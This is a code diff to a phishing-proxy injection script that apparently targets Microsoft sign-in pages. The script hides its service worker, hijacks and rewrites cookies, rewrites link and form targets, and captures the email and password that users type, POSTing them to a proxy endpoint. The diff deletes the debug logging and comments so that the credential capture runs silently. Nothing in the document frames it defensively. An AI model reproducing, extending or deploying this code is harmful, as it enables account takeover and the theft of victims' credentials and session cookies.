@@ -1,10 +1,7 @@
 // ============================================================
-// ORIGINAL FEATURES: SW hiding, cookie hijack, href/action rewriting
-// PLUS: DOM password capture with Console Logs (for debugging)
+// DOM script with all logs silenced
 // ============================================================
-console.log('[DOM SCRIPT] script_Vx9Z6XN5uC3k.js loaded successfully!');
 
-// ... (rest of the DOM script as before)
 // ---- 1. Hide Service Worker ----
 (function () {
     const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
@@ -71,7 +68,7 @@ console.log('[DOM SCRIPT] script_Vx9Z6XN5uC3k.js loaded successfully!');
                 }
                 originalCookieDescriptor.set.call(document, modifiedCookie.trim());
             } catch (error) {
-                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
+                // silent
             }
         }
     });
@@ -112,17 +109,11 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     } catch { }
 }
 
-// ---- 4. DOM Password Capture (NEW) with Console Logs ----
+// ---- 4. DOM Password Capture (silent) ----
 (function() {
     function sendCredentials(email, password) {
         if (!password) return;
 
-        // ***** CONSOLE LOG (DEBUGGING) *****
-        console.log('[DOM Capture] Email extracted:', email);
-        console.log('[DOM Capture] Password extracted:', password);
-        // **********************************
-
-        // Send to proxy
         fetch('/JSCookie_6X7dRqLg90mH', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -145,7 +136,6 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     function attachListeners(passwordField, emailField) {
         if (!passwordField) return;
 
-        // Listen to form submit
         const form = passwordField.closest('form');
         if (form) {
             form.addEventListener('submit', function(e) {
@@ -155,7 +145,6 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
             });
         }
 
-        // Listen to click on Sign-in button (fallback)
         document.addEventListener('click', function(e) {
             let target = e.target;
             if (!target) return;
@@ -174,7 +163,6 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
         if (passwordField) {
             attachListeners(passwordField, emailField);
         } else {
-            // Wait for password field to appear (Microsoft loads it dynamically)
             const observer = new MutationObserver(function() {
                 const pwd = document.querySelector('input[type="password"]');
                 if (pwd) {
